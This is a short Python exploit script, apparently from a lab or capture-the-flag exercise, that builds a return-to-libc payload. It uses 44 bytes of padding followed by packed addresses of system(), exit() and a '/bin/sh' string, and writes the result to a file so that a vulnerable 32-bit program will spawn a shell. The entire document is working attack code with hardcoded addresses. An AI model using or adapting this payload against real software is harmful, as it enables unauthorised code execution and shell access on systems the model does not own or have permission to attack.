import sys
import struct

# --- Addresses from your GDB session ---
system_addr = 0xf7d9e170
exit_addr   = 0xf7d90460
binsh_addr  = 0xf7f130d5

# --- Payload Construction ---
# Padding: We calculated exactly 44 bytes to reach the Return Address
padding = b"A" * 44

# The Return-to-Libc Chain
# Stack Layout: [ system_addr ] [ return_after_system ] [ argument_for_system ]
# We overwrite the Return Address with system()
exploit = struct.pack("<I", system_addr)
exploit += struct.pack("<I", exit_addr)
exploit += struct.pack("<I", binsh_addr)

# Combine them
payload = padding + exploit

# Write to file
try:
    with open("payload_sec", "wb") as f:
        f.write(payload)
except IOError as e:
    print(f"Error: {e}")